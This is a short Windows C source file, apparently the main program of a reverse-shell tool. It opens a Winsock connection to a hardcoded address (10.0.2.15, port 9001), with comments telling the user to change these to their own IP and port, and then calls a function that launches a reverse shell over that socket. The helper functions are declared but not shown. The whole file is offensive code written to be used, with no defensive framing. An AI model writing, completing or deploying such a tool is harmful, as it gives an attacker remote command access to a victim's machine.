// main.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

// Function declarations
SOCKET create_socket(const char *ip_addr, int port);
void create_reverse_shell(SOCKET sock);

int main() {
    char *ip_addr = "10.0.2.15"; // Change to your IP
    int port = 9001;            // Change to your port

    // Step 1: Create socket
    SOCKET sock = create_socket(ip_addr, port);
    if (sock == INVALID_SOCKET) {
        return 1;
    }

    // Step 2: Launch reverse shell
    create_reverse_shell(sock);

    // Clean up
    closesocket(sock);
    WSACleanup();

    return 0;
}